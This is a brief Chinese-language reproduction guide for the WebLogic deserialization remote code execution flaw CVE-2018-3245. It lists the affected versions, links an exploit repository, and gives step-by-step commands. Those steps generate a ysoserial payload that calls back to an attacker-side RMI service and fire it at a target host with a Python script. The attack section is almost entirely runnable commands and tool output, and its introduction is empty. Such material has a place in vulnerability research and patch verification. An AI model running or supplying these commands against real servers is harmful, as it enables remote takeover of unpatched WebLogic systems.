# （CVE-2018-3245）WebLogic反序列化远程代码执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3228](https://www.zhihuifly.com/t/topic/3228)

# （CVE-2018-3245）WebLogic反序列化远程代码执行漏洞

## 一、漏洞简介

## 二、漏洞影响

WebLogic 10.3.6.0

WebLogic 12.1.3.0

WebLogic 12.2.1.3

## 三、复现过程

```
https://github.com/ianxtianxt/CVE-2018-3245 
```

### Step 1

```
java -jar ysoserial-cve-2018-3245.jar 
```

```
WHY SO SERIAL?
Usage: java -jar ysoserial-cve-2018-3245.jar [payload] '[command]'
Available payload types:
     Payload         Authors   Dependencies
     -------         -------   ------------
     CVE_2018_2893_1 @mbechler
     CVE_2018_2893_2 @mbechler
     CVE_2018_2893_3 @mbechler
     CVE_2018_3245   @mbechler
     JRMPClient      @mbechler
     Jdk7u21         @frohoff 
```

### Step 2

```
java -jar ysoserial-cve-2018-3245.jar  CVE_2018_3245  "[RMI_SERVICE_IP]:[PORT]"  >  poc5.ser 
```

### Step 3

```
python weblogic.py [TARGET_HOST] [PORT] poc5.ser 
```